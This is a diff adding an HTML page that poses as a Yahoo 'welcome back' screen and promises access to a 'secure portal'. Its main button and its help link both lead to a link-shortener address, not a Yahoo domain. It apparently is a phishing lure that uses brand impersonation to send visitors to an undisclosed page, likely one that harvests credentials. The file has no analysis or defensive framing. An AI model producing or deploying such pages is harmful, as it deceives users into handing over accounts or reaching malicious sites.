@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome Back to Yahoo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f7f9fc;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #555;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            border: 2px solid #e0e0e0;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 600px;
+            padding: 30px;
+            text-align: center;
+            box-sizing: border-box;
+            position: relative;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: bold;
+            color: #410093;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            font-family: 'Trenbuch MS', cursive, sans-serif;
+            opacity: 0;
+            animation: slideIn 8s ease-in-out 1;
+        }
+
+        @keyframes slideIn {
+            0% {
+                opacity: 0;
+                transform: translateX(-100%);
+            }
+            25% {
+                opacity: 0.5;
+                transform: translateX(0);
+            }
+            50% {
+                opacity: 0.75;
+                transform: translateX(20px);
+            }
+            75% {
+                opacity: 0.9;
+                transform: translateX(-10px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            color: #555;
+        }
+
+        .btn {
+            background-color: #410093;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn:hover {
+            background-color: #3b0071;
+        }
+
+        .footer {
+            font-size: 14px;
+            color: #999;
+            margin-top: 30px;
+            text-align: center;
+        }
+
+        .footer a {
+            color: #410093;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 28px;
+            }
+
+            p {
+                font-size: 16px;
+            }
+
+            .btn {
+                width: 100%;
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 24px;
+            }
+
+            .btn {
+                font-size: 14px;
+                padding: 10px;
+            }
+
+            p {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Great to Have You Back!</h1>
+        <p>We’re excited to welcome you back to your secure portal. Access your account and continue where you left off.</p>
+        <a href="https://f.ht/bl0mbfrbwr77" class="btn">Click Here to Continue</a>
+        <p class="footer">Thank you for choosing <strong>Yahoo</strong>.</p>
+        <p class="footer"><a href="https://f.ht/bl0mbfrbwr77">Need help?</a></p>
+    </div>
+</body>
+</html>
